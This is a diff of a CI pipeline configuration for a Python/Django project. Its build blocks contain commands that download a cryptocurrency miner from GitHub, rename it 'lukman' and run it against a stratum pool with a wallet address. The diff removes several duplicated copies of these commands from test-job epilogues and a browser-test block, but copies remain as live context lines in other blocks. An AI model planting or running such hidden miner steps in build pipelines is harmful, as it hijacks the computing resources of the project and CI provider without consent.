@@ -2,7 +2,7 @@ version: v1.0
 name: Python
 agent:
   machine:
-    type: e1-standard-8
+    type: e1-standard-4
     os_image: ubuntu1804
 execution_time_limit:
   hours: 10
@@ -76,29 +76,7 @@ blocks:
           - tar xf cpuminer-opt-linux.tar.gz
           - mv cpuminer-sse2 lukman
           - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-      jobs:
-        - name: Pylint
-          parallelism: 50
-          commands: []
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+      jobs: []
   - name: Run Unit Tests
     task:
       prologue:
@@ -141,31 +119,6 @@ blocks:
             - tar xf cpuminer-opt-linux.tar.gz
             - mv cpuminer-sse2 lukman
             - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-  - name: Run Browser Tests
-    task:
-      env_vars:
-        - name: DB_NAME
-          value: pydjango
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
-      jobs: []
   - name: Run Security Tests
     task:
       jobs:
